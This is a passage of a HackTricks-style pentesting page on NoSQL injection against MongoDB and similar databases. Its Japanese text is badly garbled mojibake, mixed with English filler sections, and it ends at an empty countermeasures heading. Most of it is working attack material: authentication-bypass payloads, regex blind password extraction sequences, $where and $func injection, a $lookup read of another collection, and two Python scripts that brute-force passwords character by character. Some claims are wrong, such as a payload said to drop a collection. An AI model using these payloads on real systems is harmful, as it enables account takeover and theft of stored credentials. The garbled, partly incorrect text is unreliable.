# NoSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)ã‚’ä½¿ç”¨ã—ã¦ã€ä¸–ç•Œã§æœ€ã‚‚å…ˆé€²çš„ãªã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ã«ã‚ˆã£ã¦å¼·åŒ–ã•ã‚ŒãŸ**ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’ç°¡å˜ã«æ§‹ç¯‰**ã—ã€è‡ªå‹•åŒ–ã—ã¾ã™ã€‚\
ä»Šã™ãã‚¢ã‚¯ã‚»ã‚¹ã‚’å–å¾—ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’å…¥æ‰‹**ã—ãŸã„ã§ã™ã‹ã€ã¾ãŸã¯HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ã”è¦§ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã—ã¦ãã ã•ã„ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricksãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks-cloud) **ã«é€ä¿¡ã—ã¦ãã ã•ã„ã€‚**

</details>

NoSQLãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã¯ã€å¾“æ¥ã®SQLãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚ˆã‚Šã‚‚ç·©ã„æ•´åˆæ€§åˆ¶ç´„ã‚’æä¾›ã—ã¾ã™ã€‚é–¢ä¿‚ã®åˆ¶ç´„ã‚„æ•´åˆæ€§ãƒã‚§ãƒƒã‚¯ãŒå°‘ãªãã¦ã‚‚ã€NoSQLãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã¯ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã¨ã‚¹ã‚±ãƒ¼ãƒªãƒ³ã‚°ã®åˆ©ç‚¹ã‚’æä¾›ã™ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ã—ã‹ã—ã€ã“ã‚Œã‚‰ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã¯ã€å¾“æ¥ã®SQLæ§‹æ–‡ã‚’ä½¿ç”¨ã—ã¦ã„ãªãã¦ã‚‚ã€ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ”»æ’ƒã®è„†å¼±æ€§ãŒã‚ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

## æ”»æ’ƒæ‰‹æ³•

PHPã§ã¯ã€é€ä¿¡ã•ã‚Œã‚‹ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’_parameter=foo_ã‹ã‚‰_parameter\[arrName]=foo_ã«å¤‰æ›´ã™ã‚‹ã“ã¨ã§ã€é…åˆ—ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

æ”»æ’ƒæ‰‹æ³•ã¯ã€**ã‚ªãƒšãƒ¬ãƒ¼ã‚¿**ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã«åŸºã¥ã„ã¦ã„ã¾ã™ã€‚
```bash
username[$ne]=1$password[$ne]=1 #<Not Equals>
username[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter
username[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value
username[$eq]=admin&password[$ne]=1 #<Equals>
username[$ne]=admin&pass[$lt]=s #<Less than>, Brute-force pass[$lt] to find more users
username[$ne]=admin&pass[$gt]=s #<Greater Than>
username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7 #<Matches non of the values of the array> (not test and not admin)
{ $where: "this.credits == this.debits" }#<IF>, can be used to execute code
```
### åŸºæœ¬èªè¨¼ã®ãƒã‚¤ãƒ‘ã‚¹

**ç­‰ã—ããªã„ ($ne) ã‚„ã‚ˆã‚Šå¤§ãã„ ($gt) ã‚’ä½¿ç”¨ã™ã‚‹**
```bash
#in URL
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```
### **SQL - Mongo**

### **SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³**

SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ã‚’é©åˆ‡ã«æ¤œè¨¼ã›ãšã«ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚¯ã‚¨ãƒªã«ç›´æ¥çµ„ã¿è¾¼ã‚€å ´åˆã«ç™ºç”Ÿã™ã‚‹ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è„†å¼±æ€§ã§ã™ã€‚ã“ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹æ”»æ’ƒè€…ã¯ã€æ„å›³ã—ãªã„ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹æ“ä½œã‚’å®Ÿè¡Œã—ãŸã‚Šã€æ©Ÿå¯†æƒ…å ±ã‚’ç›—ã¿å‡ºã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### **NoSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³**

NoSQLãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ï¼ˆMongoDBãªã©ï¼‰ã§ã¯ã€SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¨åŒæ§˜ã®è„†å¼±æ€§ãŒå­˜åœ¨ã—ã¾ã™ã€‚NoSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€ã‚¯ã‚¨ãƒªã«ç›´æ¥ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ã‚’çµ„ã¿è¾¼ã‚€ã“ã¨ã§ç™ºç”Ÿã—ã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®æ“ä½œã‚’æ”¹ã–ã‚“ã—ãŸã‚Šã€æ©Ÿå¯†æƒ…å ±ã‚’æ¼æ´©ã•ã›ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### **NoSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®ä¾‹**

ä»¥ä¸‹ã¯ã€NoSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®ä¾‹ã§ã™ã€‚

```javascript
const username = req.body.username;
const password = req.body.password;

const query = {
  username: username,
  password: password
};

db.collection('users').findOne(query, (err, user) => {
  if (err) {
    throw err;
  }

  if (user) {
    res.send('Login successful');
  } else {
    res.send('Invalid username or password');
  }
});
```

ä¸Šè¨˜ã®ã‚³ãƒ¼ãƒ‰ã§ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæä¾›ã—ãŸãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚¯ã‚¨ãƒªã‚’å®Ÿè¡Œã—ã¦ã„ã¾ã™ã€‚ã—ã‹ã—ã€ã“ã®ã‚³ãƒ¼ãƒ‰ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ã‚’é©åˆ‡ã«æ¤œè¨¼ã—ã¦ã„ã¾ã›ã‚“ã€‚ã—ãŸãŒã£ã¦ã€æ”»æ’ƒè€…ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®å€¤ã‚’æ”¹ã–ã‚“ã™ã‚‹ã“ã¨ã§ã€æ„å›³ã—ãªã„ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹æ“ä½œã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚

### **NoSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®é˜²æ­¢ç­–**

NoSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’é˜²ããŸã‚ã«ã¯ã€ä»¥ä¸‹ã®å¯¾ç­–ã‚’å®Ÿæ–½ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

- ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ã‚’é©åˆ‡ã«æ¤œè¨¼ã™ã‚‹ã€‚
- ã‚¯ã‚¨ãƒªã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ã‚’ç›´æ¥çµ„ã¿è¾¼ã¾ãšã€ãƒ—ãƒ¬ãƒ¼ã‚¹ãƒ›ãƒ«ãƒ€ãƒ¼ã‚’ä½¿ç”¨ã™ã‚‹ã€‚
- ã‚¯ã‚¨ãƒªã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã«ã¯ãƒ‡ãƒ¼ã‚¿å‹ã‚’æŒ‡å®šã™ã‚‹ã€‚
- ã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ã‚’å®Ÿæ–½ã—ã€æ¨©é™ã®ãªã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„ã‚ˆã†ã«ã™ã‚‹ã€‚

ã“ã‚Œã‚‰ã®å¯¾ç­–ã‚’å®Ÿæ–½ã™ã‚‹ã“ã¨ã§ã€NoSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã«ã‚ˆã‚‹æ”»æ’ƒã‚’é˜²ãã“ã¨ãŒã§ãã¾ã™ã€‚
```
Normal sql: ' or 1=1-- -
Mongo sql: ' || 1==1//    or    ' || 1==1%00
```
### **é•·ã•**æƒ…å ±ã®æŠ½å‡º

To extract the length information from a NoSQL database, you can use the following techniques:

NoSQL databases often provide functions or operators to retrieve the length of a field or attribute. These functions can be used to determine the length of a string or an array in the database.

For example, in MongoDB, you can use the `$strLenCP` operator to get the length of a string field. The following query retrieves the length of the `username` field in the `users` collection:

```javascript
db.users.find({ username: { $exists: true } }, { username: { $strLenCP: "" } })
```

Similarly, in CouchDB, you can use the `length()` function to get the length of an array field. The following query retrieves the length of the `emails` array in the `users` database:

```javascript
function(doc) {
  emit(doc._id, doc.emails.length);
}
```

By injecting a NoSQL injection payload into these queries, you can extract the length information of specific fields or attributes in the database. This can be useful for understanding the structure and size of the data stored in the NoSQL database.
```bash
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
# True if the length equals 1,3...
```
### **ãƒ‡ãƒ¼ã‚¿**æƒ…å ±ã®æŠ½å‡º

NoSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€NoSQLãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«å¯¾ã™ã‚‹æ”»æ’ƒæ‰‹æ³•ã®ä¸€ã¤ã§ã™ã€‚ã“ã®æ”»æ’ƒæ‰‹æ³•ã§ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ã‚’é©åˆ‡ã«æ¤œè¨¼ã›ãšã«ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚¯ã‚¨ãƒªã«çµ„ã¿è¾¼ã‚€ã“ã¨ã«ã‚ˆã£ã¦ã€æ‚ªæ„ã®ã‚ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰æƒ…å ±ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒå¯èƒ½ã¨ãªã‚Šã¾ã™ã€‚

NoSQLãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã¯ã€SQLãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã¨ã¯ç•°ãªã‚‹ãƒ‡ãƒ¼ã‚¿ãƒ¢ãƒ‡ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã„ã¾ã™ã€‚ãã®ãŸã‚ã€å¾“æ¥ã®SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ”»æ’ƒæ‰‹æ³•ã¯é€šå¸¸ã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“ã€‚ã—ã‹ã—ã€NoSQLãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã§ã‚‚åŒæ§˜ã«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ã‚’ä¿¡é ¼ã›ãšã«ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚¯ã‚¨ãƒªã‚’æ§‹ç¯‰ã™ã‚‹ã¨ã€æ”»æ’ƒè€…ã¯ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰æƒ…å ±ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

NoSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ”»æ’ƒã§ã¯ã€æ”»æ’ƒè€…ã¯ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚¯ã‚¨ãƒªã«å¯¾ã—ã¦ç‰¹æ®Šãªæ–‡å­—åˆ—ã‚’æŒ¿å…¥ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦ã€ã‚¯ã‚¨ãƒªã®æ„å›³ã‚’å¤‰æ›´ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰æ©Ÿå¯†æƒ…å ±ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä¾‹ãˆã°ã€æ”»æ’ƒè€…ã¯èªè¨¼æƒ…å ±ã‚„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å€‹äººæƒ…å ±ãªã©ã‚’ç›—ã¿å‡ºã™ã“ã¨ãŒã§ãã¾ã™ã€‚

NoSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ”»æ’ƒã‚’é˜²ããŸã‚ã«ã¯ã€å…¥åŠ›æ¤œè¨¼ã¨ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç†ãŒé‡è¦ã§ã™ã€‚å…¥åŠ›æ¤œè¨¼ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ã‚’é©åˆ‡ã«æ¤œè¨¼ã—ã¦ä¸æ­£ãªæ–‡å­—åˆ—ã‚’æ’é™¤ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒã‚’é˜²ãã¾ã™ã€‚ã¾ãŸã€ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç†ã¯ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚¯ã‚¨ãƒªã«çµ„ã¿è¾¼ã‚€å‰ã«ç‰¹æ®Šæ–‡å­—ã‚’ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ãŒæ„å›³ã—ãªã„æ“ä½œã‚’è¡Œãˆãªã„ã‚ˆã†ã«ã—ã¾ã™ã€‚

NoSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ”»æ’ƒã¯ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®è„†å¼±æ€§ã¨ã—ã¦é‡è¦ãªå•é¡Œã§ã™ã€‚ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®é–‹ç™ºè€…ã‚„ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒ¼ãƒ ã¯ã€é©åˆ‡ãªå¯¾ç­–ã‚’è¬›ã˜ã‚‹ã“ã¨ã§ã€ã“ã®æ”»æ’ƒã‹ã‚‰ãƒ‡ãƒ¼ã‚¿ã‚’å®ˆã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
in URL (if length == 3)
username[$ne]=toto&password[$regex]=a.{2}
username[$ne]=toto&password[$regex]=b.{2}
...
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```
### **SQL - Mongo**

MongoDB is a popular NoSQL database that uses a document-oriented model. It is widely used in web applications and offers flexibility and scalability. However, like any other database, MongoDB is also vulnerable to injection attacks.

#### **NoSQL Injection**

NoSQL injection is similar to SQL injection, but it targets NoSQL databases like MongoDB. In a NoSQL injection attack, an attacker manipulates the input data to exploit vulnerabilities in the application's query logic.

#### **Query Structure**

MongoDB queries are structured using JSON-like syntax. The queries consist of key-value pairs, where the key represents the field to be queried and the value represents the search criteria.

#### **Exploiting NoSQL Injection**

To exploit a NoSQL injection vulnerability, an attacker needs to identify injection points in the application. These injection points can be found in user input fields, such as login forms, search boxes, or any other input that is used in database queries.

Once an injection point is identified, an attacker can manipulate the input to bypass authentication, retrieve sensitive information, or modify the query logic to perform unauthorized actions.

#### **Payloads**

NoSQL injection payloads are similar to SQL injection payloads. However, since MongoDB uses a different query syntax, the payloads need to be modified accordingly.

Some common NoSQL injection payloads include:

- `$ne`: Matches values that are not equal to the specified value.
- `$gt`: Matches values that are greater than the specified value.
- `$gte`: Matches values that are greater than or equal to the specified value.
- `$lt`: Matches values that are less than the specified value.
- `$lte`: Matches values that are less than or equal to the specified value.
- `$regex`: Matches values based on a regular expression pattern.

#### **Prevention**

To prevent NoSQL injection attacks, it is important to follow secure coding practices:

- Input validation: Validate and sanitize user input to prevent malicious data from being injected into queries.
- Parameterized queries: Use parameterized queries or prepared statements to ensure that user input is treated as data and not as part of the query logic.
- Least privilege principle: Limit the privileges of the database user used by the application to minimize the impact of a successful injection attack.
- Regular updates: Keep the MongoDB server and drivers up to date to benefit from the latest security patches and improvements.

By following these practices, you can significantly reduce the risk of NoSQL injection vulnerabilities in your application.
```
/?search=admin' && this.password%00 --> Check if the field password exists
/?search=admin' && this.password && this.password.match(/.*/)%00 --> start matching password
/?search=admin' && this.password && this.password.match(/^a.*$/)%00
/?search=admin' && this.password && this.password.match(/^b.*$/)%00
/?search=admin' && this.password && this.password.match(/^c.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj78i3u$/)%00  Found
```
### PHPä»»æ„é–¢æ•°å®Ÿè¡Œ

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ä½¿ç”¨ã•ã‚Œã‚‹[MongoLite](https://github.com/agentejo/cockpit/tree/0.11.1/lib/MongoLite)ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®**$func**æ¼”ç®—å­ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€[ã“ã®ãƒ¬ãƒãƒ¼ãƒˆ](https://swarm.ptsecurity.com/rce-cockpit-cms/)ã®ã‚ˆã†ã«ä»»æ„ã®é–¢æ•°ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚
```python
"user":{"$func": "var_dump"}
```
![](<../.gitbook/assets/image (468).png>)

### ç•°ãªã‚‹ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‹ã‚‰æƒ…å ±ã‚’å–å¾—ã™ã‚‹

[**$lookup**](https://www.mongodb.com/docs/manual/reference/operator/aggregation/lookup/)ã‚’ä½¿ç”¨ã—ã¦ã€ç•°ãªã‚‹ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‹ã‚‰æƒ…å ±ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æ¬¡ã®ä¾‹ã§ã¯ã€**`users`**ã¨ã„ã†ç•°ãªã‚‹ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‹ã‚‰èª­ã¿å–ã‚Šã‚’è¡Œã„ã€ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰ã«ä¸€è‡´ã™ã‚‹ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æŒã¤ã™ã¹ã¦ã®ã‚¨ãƒ³ãƒˆãƒªã®çµæœã‚’å–å¾—ã—ã¦ã„ã¾ã™ã€‚
```json
[
{
"$lookup":{
"from": "users",
"as":"resultado","pipeline": [
{
"$match":{
"password":{
"$regex":"^.*"
}
}
}
]
}
}
]
```
<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)ã‚’ä½¿ç”¨ã—ã¦ã€ä¸–ç•Œã§æœ€ã‚‚é«˜åº¦ãªã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ã«ã‚ˆã£ã¦å¼·åŒ–ã•ã‚ŒãŸ**ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’ç°¡å˜ã«æ§‹ç¯‰**ã—ã€è‡ªå‹•åŒ–ã—ã¾ã™ã€‚\
ä»Šã™ãã‚¢ã‚¯ã‚»ã‚¹ã‚’å–å¾—ã—ã¦ãã ã•ã„ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Blind NoSQL
```python
import requests, string

alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(21):
print("[i] Looking for char number "+str(i+1))
for char in alphabet:
r = requests.get("http://chall.com?param=^"+flag+char)
if ("<TRUE>" in r.text):
flag += char
print("[+] Flag: "+flag)
break
```

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""

while True:
for c in string.printable:
if c not in ['*','+','.','?','|']:
payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
r = requests.post(u, data = {'ids': payload}, verify = False)
if 'OK' in r.text:
print("Found one more char : %s" % (password+c))
password += c
```
## MongoDB ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰

### NoSQL Injection

NoSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€MongoDBãªã©ã®NoSQLãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«å¯¾ã™ã‚‹ä¸€èˆ¬çš„ãªæ”»æ’ƒæ‰‹æ³•ã§ã™ã€‚ã“ã®æ”»æ’ƒã§ã¯ã€ã‚¯ã‚¨ãƒªãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã«æ‚ªæ„ã®ã‚ã‚‹å…¥åŠ›ã‚’æ³¨å…¥ã™ã‚‹ã“ã¨ã§ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®æ©Ÿèƒ½ã‚’æ‚ªç”¨ã—ã¾ã™ã€‚

### ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ä¾‹

ä»¥ä¸‹ã«ã€NoSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã«ä½¿ç”¨ã•ã‚Œã‚‹ä¸€èˆ¬çš„ãªMongoDBãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ä¾‹ã‚’ç¤ºã—ã¾ã™ã€‚

#### ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®èªè¨¼ãƒã‚¤ãƒ‘ã‚¹

```javascript
username[$ne]=admin&password[$ne]=password
```

ã“ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ã€`username`ãŒ`admin`ã§ãªãã€`password`ãŒ`password`ã§ãªã„å ´åˆã«ã€èªè¨¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¾ã™ã€‚

#### ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®æƒ…å ±æ¼æ´©

```javascript
username[$regex]=.*&password[$regex]=.*
```

ã“ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ã€æ­£è¦è¡¨ç¾ã‚’ä½¿ç”¨ã—ã¦ã€ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æ¼æ´©ã•ã›ã¾ã™ã€‚

#### ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã®ãƒ‰ãƒ­ãƒƒãƒ—

```javascript
username[$ne]=admin&password[$ne]=password&$where=1==1
```

ã“ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ã€`username`ãŒ`admin`ã§ãªãã€`password`ãŒ`password`ã§ãªã„å ´åˆã«ã€ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒ‰ãƒ­ãƒƒãƒ—ã—ã¾ã™ã€‚

### å¯¾ç­–æ–¹æ³•

